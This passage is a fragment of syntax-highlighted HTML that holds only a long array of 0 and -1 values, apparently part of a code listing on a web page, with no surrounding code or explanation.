class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span 